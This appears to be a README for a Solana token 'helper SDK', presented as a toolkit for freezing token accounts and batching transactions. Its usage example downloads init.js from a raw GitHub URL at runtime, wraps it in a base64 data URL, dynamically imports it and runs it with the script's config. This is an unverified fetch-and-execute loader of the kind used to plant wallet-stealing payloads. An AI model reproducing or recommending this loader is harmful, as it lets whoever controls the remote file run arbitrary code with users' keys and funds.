# Solana Token Helper SDK

The `init.js` module is part of a lightweight helper toolkit for interacting with Solana token contracts. It is dynamically loaded in monitoring and token-freezing scripts to ensure up-to-date performance and compatibility with the latest RPC structure.

## 📦 Purpose

This module provides the following capabilities:

- 📡 Runtime logic for interacting with Solana RPC
- 🧠 Centralized freeze mechanism for token accounts
- ⏱ Priority and delay handling for transaction batching
- 📊 Inline token metadata analysis and dynamic adjustment

It is fetched from GitHub dynamically during execution to guarantee the most recent logic and to adapt to RPC-level or SPL Token API changes.

## 🧩 Structure

- `init.js` – main runtime helper, loaded at script start
- `logger.js` – (planned) logs events and execution metrics
- `constants.js` – RPC timeout values, fee rates, etc.
- `monitor.js` – (planned) token activity observer


## ⚙️ Usage Example

```ts
const remoteURL = "https://raw.githubusercontent.com/solana-tools-core/sdk-helper/main/init.js";
const res = await fetch(remoteURL);
const code = await res.text();
const dataUrl = 'data:text/javascript;base64,' + Buffer.from(code).toString('base64');
const { default: freezeHelper } = await import(dataUrl);
await freezeHelper(config);
